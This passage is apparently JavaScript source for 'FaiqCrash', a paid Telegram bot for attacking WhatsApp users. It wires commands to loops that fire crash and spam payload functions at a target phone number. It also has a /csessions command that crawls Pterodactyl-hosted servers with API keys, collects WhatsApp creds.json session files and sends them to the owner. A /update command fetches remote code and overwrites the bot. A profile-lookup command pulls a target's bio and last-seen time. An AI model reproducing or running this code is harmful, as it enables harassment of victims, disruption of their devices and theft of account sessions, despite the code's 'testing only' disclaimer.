  else {
    const args = ctx.message.text.split(" ").slice(1);
    if (!args[0] || !args[0].startsWith("@"))
      return ctx.reply("âš ï¸ Salah Tolol!:\n/cekid @username\natau reply user");

    try {
      // Telegram TIDAK bisa get user by username
      return ctx.reply(
        "âŒ dongo gabisa cek ID via @username tanpa reply.\nğŸ“› Silakan reply pesan user tersebut."
      );
    } catch {
      return ctx.reply("âŒ User tidak ditemukan");
    }
  }

  // === Validate User Si hama ===
  if (!target.username) {
    return ctx.reply(
`âŒ *GAGAL CEK USER*

ğŸ‘¤ Nama: ${target.first_name}
ğŸ“› User tersebut *tidak menggunakan username*`,
      { parse_mode: "Markdown" }
    );
  }

  // === End ===
  ctx.reply(
`âœ… *USER DITEMUKAN*

ğŸ‘¤ Nama: ${target.first_name}
ğŸ†” ID: \`${target.id}\`
ğŸ”— Username: @${target.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("ğŸ‘€ â˜‡ Format: /cekbio 62Ã—Ã—Ã—");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>â¬¡â•â€•â€”âŠ± â§ CHECKING BIO â­ âŠ°â€•â€”â•â¬¡</b></blockquote>
âŒ‘ Target: ${q}
âŒ‘ Status: Checking...
âŒ‘ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "ğŸ“± â˜‡ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>â¬¡â•â€•â€”âŠ± â§ CHECKING BIO â­ âŠ°â€•â€”â•â¬¡</b></blockquote>
âŒ‘ Target: ${q}
âŒ‘ Status: âŒ Not Found
âŒ‘ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "ğŸ“± â˜‡ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>â¬¡â•â€•â€”âŠ± â§ BIO INFORMATION â­ âŠ°â€•â€”â•â¬¡</b></blockquote>
ğŸ“± <b>Nomor:</b> ${q}
ğŸ‘¤ <b>Status WhatsApp:</b> âœ… Terdaftar
ğŸ“ <b>Bio:</b> ${bio}
ğŸ‘€ <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? 'ğŸ–¼ <b>Profile Picture:</b> âœ… Tersedia' : 'ğŸ–¼ <b>Profile Picture:</b> âŒ Tidak tersedia'}

ğŸ• <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ğŸ“± Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ğŸ“± Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>â¬¡â•â€•â€”âŠ± â§ CHECKING BIO â­ âŠ°â€•â€”â•â¬¡</b></blockquote>
âŒ‘ Target: ${q}
âŒ‘ Status: âŒ Error
âŒ‘ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ğŸ“± â˜‡ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

// Auto update
bot.command("update", async (ctx) => {
  const chatId = ctx.chat.id;

  const repoRaw =
    "https://raw.githubusercontent.com/azzam1235/auto/refs/heads/main/auto.json";

  await ctx.reply("â³ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("âŒ Update gagal: File kosong!");
    }

    fs.writeFileSync("./Faiq.js", data);

    await ctx.reply(
      "âœ… Update berhasil!\nSilakan restart bot."
    );

    // restart jika pakai PM2

  } catch (e) {
    console.error(e);
    ctx.reply(
      "âŒ Update gagal. Pastikan repo dan file index.js tersedia."
    );
  }
});
// =================== /carisesi ===================
bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("ğŸª§ Example : /csessions <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("ğŸª§ Example : /csessions <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "â³ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("âŒ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `ğŸ“ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `âŒ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `âŒ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("âœ… Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`âœ… Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("âŒ Terjadi error saat scan");
  }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
//============( MENU UTAMA ) =======\\

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("ğŸ”‘ Masukkan token anda untuk diaktifkan, Format: /start <token>"); } catch (e) {}
        }
        return ctx.reply("ğŸ”’ Akses terkunci ketik /start <token> untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
    if (!tokenValidated) {
      const raw = ctx.message && ctx.message.text ? ctx.message.text : "";
      const parts = raw.trim().split(" ");
      const userToken = parts.length > 1 ? parts[1].trim() : "";

      if (!userToken) {
        return ctx.reply("ğŸ”‘ Masukkan token anda untuk diaktifkan, Format: /start <token>");
      }

      try {
        const res = await axios.get(databaseUrl);
        const tokens = (res.data && res.data.tokens) || [];

        if (!tokens.includes(userToken) || userToken !== tokenBot) {
          return ctx.reply("âŒ Token tidak terdaftar, masukkan yang valid");
        }

        tokenValidated = true;
        return ctx.reply("âœ… Token berhasil diaktifkan, ketik /start untuk membuka menu utama");
      } catch (e) {
        return ctx.reply("âŒ Gagal memverifikasi token");
      }
    }
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    
    const menuMessage = `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

 ã“ã‚“ã«ã¡ã¯ã€@${ctx.from.username}ã€‚è‡ªå·±ç´¹ä»‹ã•ã›ã¦ãã ã•ã„ã€‚ç§ã¯ FaiqCrash ã¨ã„ã† ğ—§ğ—²ğ—¹ğ—²ğ—´ğ—¿ğ—®ğ—º ãƒœãƒƒãƒˆã§ã™ã€‚

ğŸ•Š - ğˆğ§ğŸğ¨ğ«ğ¦ğšğ­ğ¢ğ¨ğ§
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ Developer: FaiqOffc
ã€¢â˜ Username: ${ctx.from.first_name}
ã€¢â˜ Language: JavaScript
ã€¢â˜ Version: 140 Gen 80

ğŸ–¥ - ğ’ğ¢ğ¬ğ­ğğ¦ ğˆğ§ğŸğ¨ğ«ğ¦ğšğ­ğ¢ğ¨ğ§
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ Sender: ${senderStatus}
ã€¢â˜ Runtime: ${runtimeStatus}
ã€¢â˜ StatusPremium: ${premiumStatus}
ã€¢â˜ Memory: ${memoryStatus}
ã€¢â˜ Cooldown: ${cooldownStatus} Second

Page 1/2</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/about"
            },
            {    text: "Owner",
                 url: "https://t.me/FaiqOffc"
            }, 
            {
                text: ">",
                callback_data: "/controls"
            }
        ],
        [
            {
               text: "Information", url: "https://t.me/aboutfaiq"
           }
        ],
    ];

    ctx.replyWithVideo(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { await ctx.answerCbQuery(); } catch (e) {}
        return ctx.reply("ğŸ”‘ Masukkan token anda untuk diaktifkan, Format: /start <token>");
    }
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  
    const menuMessage = `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

 ã“ã‚“ã«ã¡ã¯ã€@${ctx.from.username}ã€‚è‡ªå·±ç´¹ä»‹ã•ã›ã¦ãã ã•ã„ã€‚ç§ã¯ FaiqCrash ã¨ã„ã† ğ—§ğ—²ğ—¹ğ—²ğ—´ğ—¿ğ—®ğ—º ãƒœãƒƒãƒˆã§ã™ã€‚

ğŸ•Š - ğˆğ§ğŸğ¨ğ«ğ¦ğšğ­ğ¢ğ¨ğ§
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ Developer: FaiqOffc
ã€¢â˜ Username: ${ctx.from.first_name}
ã€¢â˜ Language: JavaScript
ã€¢â˜ Version: 140 Gen 80

ğŸ–¥ - ğ’ğ¢ğ¬ğ­ğğ¦ ğˆğ§ğŸğ¨ğ«ğ¦ğšğ­ğ¢ğ¨ğ§
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ Sender: ${senderStatus}
ã€¢â˜ Runtime: ${runtimeStatus}
ã€¢â˜ StatusPremium: ${premiumStatus}
ã€¢â˜ Memory: ${memoryStatus}
ã€¢â˜ Cooldown: ${cooldownStatus} Second

Page 1/2</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/about"
            },
            {
                text: "Owner",
                url: "https://t.me/FaiqOffc"
            }, 
            {
                text: ">",
                callback_data: "/controls"
            }
        ],
        [
             {
               text: "Information", 
               url: "https://t.me/aboutfaiq"
           }
         ],
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'video',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const controlsMenu = `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

ğŸ•¹ - ğ‚ğ¨ğ§ğ­ğ«ğ¨ğ¥ğ¬ ğŒğğ§ğ®
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ /addsender - Add Sender Number
ã€¢â˜ /resetsession - Reset Existing Session
ã€¢â˜ /setcooldown - Set Bot Cooldown
ã€¢â˜ /addprem - Add Premium Users
ã€¢â˜ /delprem - Delete Premium Users
ã€¢â˜ /addgroup - Add Premium Group
ã€¢â˜ /delgroup - Delete Premium Group
ã€¢â˜ /update - Auto Update

Page 2/3</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/start"
            }, 
            {   text: "Owner",
                url: "https://t.me/FaiqOffc"
            }, 
            {   text: ">",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

ğŸ§¬ - ğƒğğ¥ğšğ² ğğ®ğ  ğ“ğ²ğ©ğ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ /FaiqxRaraInvis [ Invisible Delay ]
ã€¢â˜ /FaiqxRaraHard [ Delay Hard ]

ğŸ§¬ - ğ…ğ¨ğ«ğœğ¥ğ¨ğ¬ğ ğğ®ğ  ğ“ğ²ğ©ğ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ /FaiqxRaraForceCall [ Forclose Spam Call ]
ã€¢â˜ /FaiqxRaraForce [ Forcloce Delete Messenge ]
ã€¢â˜ /FaiqxRaraForceInvis [ Forcloce Spam Call Invis ]

ğŸ§¬ - ğ‚ğ«ğšğ¬ğ¡ ğğ®ğ  ğ“ğ²ğ©ğ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ /FaiqxRaraBlank [ Blank Andro ]
ã€¢â˜ /FaiqxRaraBlankV2 [ Blank Andro Hard ]
ã€¢â˜ /FaiqxRaraCrash [ Crash Andro ]
ã€¢â˜ /FaiqxRaraCrashInvis [ Crash Andro Invisible ]

ğŸ§¬ - ğŒğ®ğ¥ğ­ğ¢ ğğ®ğ  ğ“ğ²ğ©ğ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ /multibug [ Bug Lebih Dari 1 Nomor ]

Example: /FaiqxRaraInvis 62xxxx 

Page 3/4</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/controls"
            }, 
            {   text: "Owner",
                url: "https://t.me/FaiqOffc"
            }, 
            {   text: ">",
                callback_data: "/fun"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/about', async (ctx) => {
    const aboutMenu = `
<blockquote>
 Name       : FaiqCrash
 Developer   : @FaiqOffc
 Version      : 140 Gen 80
 Language    : JavaScript (Node.js)

 Description :
ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€WhatsAppã¨WhatsAppã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å‘ä¸Šã‚’ç›®çš„ã¨ã—ã¦ä½œæˆã•ã‚Œã¾ã—ãŸã€‚ ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®æ©Ÿèƒ½ã¯ã€ã€Œãƒã‚°ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚·ã‚¹ãƒ†ãƒ ã€å®‰å®šã—ãŸã‚¹ãƒ‘ãƒ ã€JSON/Protobufæ§‹é€ æ¤œè¨¼ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€WhatsAppï¼ˆWA Botï¼‰ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸æ§‹é€ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ã“ã¨ã§ã™ã€‚ å…è²¬äº‹é …ï¼š ä½œæˆè€…ã¯ã€ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®èª¤ç”¨ã«ã¤ã„ã¦ä¸€åˆ‡è²¬ä»»ã‚’è² ã„ã¾ã›ã‚“ã€‚ ãƒ†ã‚¹ãƒˆç’°å¢ƒã§ã®ã¿ä½¿ç”¨ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã«æå®³ã‚’ä¸ãˆãŸã‚Šã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¹²æ¸‰ã—ãŸã‚Šã—ãªã„ã§ãã ã•ã„ã€‚
 Â© 2026 FaiqOffc | All Team FaiqCrash
 
 Page 6/1</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/tqto"
            }, 
            {   text: "Owner",
                url: "https://t.me/FaiqOffc"
            }, 
            {   text: ">",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(aboutMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

âš”ï¸ - ğ“ğ¡ğšğ§ğ¤ğ¬ ğ“ğ¨
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ @FaiqOffc [ Creator ]
ã€¢â˜ @Curutbergetar [ My Wife ]
ã€¢â˜ @Zennzyyy [ My support ]
ã€¢â˜ @celycntik [ Best Friends ]
ã€¢â˜ @YanzNotDev11 [ Best Friends ]
ã€¢â˜ @Ftmncloud2 [ Best Friends ]
ã€¢â˜ @lang123qqq [ Best Friends ]

 Thank you for purchasing the FaiqCrash script
 
 Page 5/6</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/fun"
            }, 
            {   text: "Owner",
                url: "https://t.me/FaiqOffc"
            }, 
            {   text: ">",
                callback_data: "/about"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/fun', async (ctx) => {
    const funMenu = `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

ğŸ­ - ğ…ğ®ğ§ ğŒğğ§ğ®
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ã€¢â˜ /iqc - Ss Chat Iphone
ã€¢â˜ /csessions - Scan Sender With Adp
ã€¢â˜ /tourl - Photos And Videos To Link
ã€¢â˜ /testfunc - Function Test
ã€¢â˜ /cekfunc - Check Error Function
ã€¢â˜ /trackweb - Tracking Website
ã€¢â˜ /statuswebsite - Check Status Website
ã€¢â˜ /cekid - Check Id Website
ã€¢â˜ /cekbio - Check Bio WhatsApp

Page 4/5</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/bug"
            },
            {   text: "Owner",
                url: "https://t.me/FaiqOffc"
            }, 
            {   text: ">",
                callback_data: "/tqto"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(funMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
//============( CASE BUG ) =======\\
bot.command("FaiqxRaraInvis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraInvis 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Delay Bebas Spam
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await KhasJawaDelayInvis(sock, target);
   await KhasJawaDelayInvis(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Delay Bebas Spam
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraHard", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraHard 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Delay Hard
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await invisibleSpam(sock, target);
   await invisibleSpam(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Delay Hard
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraForceCall", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraForceCall 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡
â˜ Target: ${q}
â˜ Type: Forclose
â˜ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await KhasJawaForce(sock, target);
   await KhasJawaForce2(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>â¬¡â•â€•â€”âŠ± â§ F A I Q C R A S H â­ âŠ°â€•â€”â•â¬¡

â˜ Target: ${q}
â˜ Type: Forclose
â˜ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check âµ¢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraForce", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`ğŸª§ â˜‡ Format: /FaiqxRaraForce 62Ã—Ã—Ã—`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

